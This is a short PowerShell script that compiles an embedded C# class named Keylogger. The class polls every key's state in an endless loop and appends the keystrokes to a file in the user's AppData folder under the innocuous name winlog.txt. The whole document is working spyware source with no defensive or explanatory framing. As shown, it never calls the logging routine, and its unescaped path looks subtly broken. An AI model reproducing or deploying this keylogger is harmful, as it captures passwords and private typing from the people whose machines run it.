$logPath = "$env:APPDATA\winlog.txt"
Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Runtime.InteropServices;
public class Keylogger {
    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(int vKey);
    public static void Main() {
        while (true) {
            for (int i = 0; i < 255; i++) {
                if (GetAsyncKeyState(i) != 0) {
                    File.AppendAllText("$logPath", ((ConsoleKey)i).ToString());
                }
            }
        }
    }
}
"@ -Language CSharp
